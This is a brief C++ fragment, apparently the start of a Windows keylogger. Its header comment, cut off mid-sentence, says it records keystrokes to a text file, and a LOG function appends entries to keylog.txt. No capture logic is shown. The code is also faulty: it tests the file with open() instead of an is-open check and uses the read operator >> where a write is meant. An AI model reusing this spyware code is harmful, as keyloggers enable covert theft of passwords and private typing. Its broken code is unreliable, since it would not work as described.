//This program records the keystrokes in a text file called 

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
using namespace std;

void LOG(string keystroke){
  fstream logFile;
  logFile.open("keylog.txt", ios::app);
  if(logFile.open()){
    logFile >> keystroke;
    logFile.close();
  }
}






